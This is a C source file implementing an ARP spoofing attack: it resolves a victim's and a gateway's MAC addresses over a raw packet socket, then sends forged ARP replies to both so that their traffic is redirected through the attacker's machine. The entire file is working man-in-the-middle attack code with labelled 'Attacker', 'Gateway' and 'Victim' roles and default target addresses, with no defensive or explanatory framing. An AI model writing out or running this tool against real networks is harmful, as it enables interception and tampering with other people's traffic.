#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>

void print_addrs(const char *msg, uint32_t ip, unsigned char *mac) {
	printf("%9s:\t%s\t%02x:%02x:%02x:%02x:%02x:%02x\n", msg, inet_ntoa((struct in_addr){.s_addr=ip}), (unsigned char)mac[0], (unsigned char)mac[1], (unsigned char)mac[2], (unsigned char)mac[3], (unsigned char)mac[4], (unsigned char)mac[5]);
}

void set_ifr_name(struct ifreq *ifr, const char *if_name) {
	size_t if_name_len = strlen(if_name);
	if(if_name_len < sizeof(ifr->ifr_name)) {
		memcpy(ifr->ifr_name, if_name, if_name_len);
		ifr->ifr_name[if_name_len] = 0;
	}
}

void request_mac(int fd, const char *if_name, struct ether_arp *req, uint32_t ip_addr) {
	const unsigned char ether_broadcast_addr[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
	struct ifreq ifr;
	set_ifr_name(&ifr, if_name);

	struct sockaddr_ll addr = {0};
	addr.sll_family = AF_PACKET;
	ioctl(fd, SIOCGIFINDEX, &ifr);
	addr.sll_ifindex = ifr.ifr_ifindex;
	addr.sll_halen = ETHER_ADDR_LEN;
	addr.sll_protocol = htons(ETH_P_ARP);
	memcpy(addr.sll_addr, ether_broadcast_addr, ETHER_ADDR_LEN);

	/* ARP request */
	req->arp_hrd = htons(ARPHRD_ETHER);
	req->arp_pro = htons(ETH_P_IP);
	req->arp_hln = ETHER_ADDR_LEN;
	req->arp_pln = sizeof(in_addr_t);
	req->arp_op = htons(ARPOP_REQUEST);

	memset(&req->arp_tha, 0, sizeof(req->arp_tha));
	memcpy(&req->arp_tpa, &ip_addr, sizeof(req->arp_tpa));
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	memcpy(&req->arp_sha, (unsigned char*)ifr.ifr_hwaddr.sa_data, sizeof(req->arp_sha));
	ioctl(fd, SIOCGIFADDR, &ifr);
	memcpy(&req->arp_spa, (unsigned char*)ifr.ifr_addr.sa_data + 2, sizeof(req->arp_spa));
	sendto(fd, req, sizeof(struct ether_arp), 0, (struct sockaddr*)&addr, sizeof(addr));

	while(1) {
		int len = recv(fd, req, sizeof(struct ether_arp), 0);
		if(len == 0)
			continue;
		unsigned int from_addr = (req->arp_spa[3] << 24) | (req->arp_spa[2] << 16) | (req->arp_spa[1] << 8) | (req->arp_spa[0] << 0);
		if(from_addr != ip_addr)
			continue;
		break;
	}
}

void arp_spoof(int fd, const char *if_name, const unsigned char *attacker_mac, uint32_t gateway_ip, const unsigned char *victim_mac, uint32_t victim_ip) {
	struct ether_arp resp;
	struct ifreq ifr;
	set_ifr_name(&ifr, if_name);
	struct sockaddr_ll addr = {0};
	addr.sll_family = AF_PACKET;
	ioctl(fd, SIOCGIFINDEX, &ifr);
	addr.sll_ifindex = ifr.ifr_ifindex;
	addr.sll_halen = ETHER_ADDR_LEN;
	addr.sll_protocol = htons(ETH_P_ARP);
	memcpy(addr.sll_addr, victim_mac, ETHER_ADDR_LEN);

	resp.arp_hrd = htons(ARPHRD_ETHER);
	resp.arp_pro = htons(ETH_P_IP);
	resp.arp_hln = ETHER_ADDR_LEN;
	resp.arp_pln = sizeof(in_addr_t);
	resp.arp_op = htons(ARPOP_REPLY);

	memcpy(&resp.arp_sha, attacker_mac, sizeof(resp.arp_sha));
	memcpy(&resp.arp_spa, &gateway_ip, sizeof(resp.arp_spa));
	memcpy(&resp.arp_tha, victim_mac, sizeof(resp.arp_tha));
	memcpy(&resp.arp_tpa, &victim_ip, sizeof(resp.arp_tpa));
	sendto(fd, &resp, sizeof(resp), 0, (struct sockaddr*)&addr, sizeof(addr));
}

int main(int argc, char *argv[]) {
    if(argc != 3) {
        argv[1] = "10.0.0.1";
        argv[2] = "10.0.0.10";
    }

	struct ether_arp req;
	unsigned char attacker_mac[6], victim_mac[6], gateway_mac[6];
	struct in_addr ip_addr = {0};
	char *if_name = "eth0";
	uint32_t attacker_ip = 0, gateway_ip = 0;

	inet_aton(argv[1], &ip_addr);
	gateway_ip = ip_addr.s_addr;
	inet_aton(argv[2], &ip_addr);
	uint32_t victim_ip = ip_addr.s_addr;

	/* ARP socket */
	int fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	
	struct ifreq ifr;
	set_ifr_name(&ifr, if_name);
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, sizeof(attacker_mac));
	ioctl(fd, SIOCGIFADDR, &ifr);
	memcpy(&attacker_ip, (unsigned char*)ifr.ifr_addr.sa_data + 2, sizeof(attacker_ip));

	request_mac(fd, if_name, &req, victim_ip);
	memcpy(victim_mac, req.arp_sha, sizeof(victim_mac));
	request_mac(fd, if_name, &req, gateway_ip);
	memcpy(gateway_mac, req.arp_sha, sizeof(gateway_mac));

	puts("\t\tIP address\tMAC address");
	print_addrs("Attacker", attacker_ip, attacker_mac);
	print_addrs("Gateway", gateway_ip, gateway_mac);
	print_addrs("Victim", victim_ip, victim_mac);
	printf("\nInterface:\t%s\n", if_name);
	do {
		arp_spoof(fd, if_name, attacker_mac, gateway_ip, victim_mac, victim_ip);
		arp_spoof(fd, if_name, attacker_mac, victim_ip, gateway_mac, gateway_ip);
		break;
	} while(1);
	return 0;
}
